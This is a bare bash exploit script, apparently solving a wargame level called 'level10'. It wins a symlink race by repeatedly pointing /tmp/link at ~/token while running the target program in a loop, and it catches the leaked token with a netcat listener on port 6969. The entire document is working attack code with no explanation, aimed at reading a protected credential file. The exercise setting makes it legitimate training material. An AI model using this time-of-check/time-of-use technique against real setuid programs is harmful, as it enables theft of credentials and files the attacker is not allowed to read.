#!/bin/bash

touch /tmp/swap
while true; do
  ln -sf /tmp/swap /tmp/link;
  ln -sf ~/token /tmp/link;
done &
while true; do
  nc -l 6969;
done &
while true; do
  ~/level10 /tmp/link 127.0.0.1;
done
